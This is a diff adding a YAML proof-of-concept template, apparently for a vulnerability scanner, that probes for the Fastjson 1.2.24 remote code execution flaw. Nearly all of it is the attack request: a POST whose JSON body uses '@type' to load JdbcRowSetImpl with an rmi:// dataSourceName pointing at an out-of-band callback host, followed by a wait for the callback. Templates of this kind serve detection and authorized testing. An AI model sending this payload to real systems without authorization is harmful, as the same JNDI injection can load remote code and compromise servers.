@@ -1,0 +1,21 @@
+name: poc-yaml-fastjson-1.2.24-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json
+      body: |
+        {
+            "b":{
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "rmi://{{reverseURL}}/TouchFile",
+            "autoCommit": true
+            }
+        }
+    expression: reverse.wait(5)
+expression: r0()
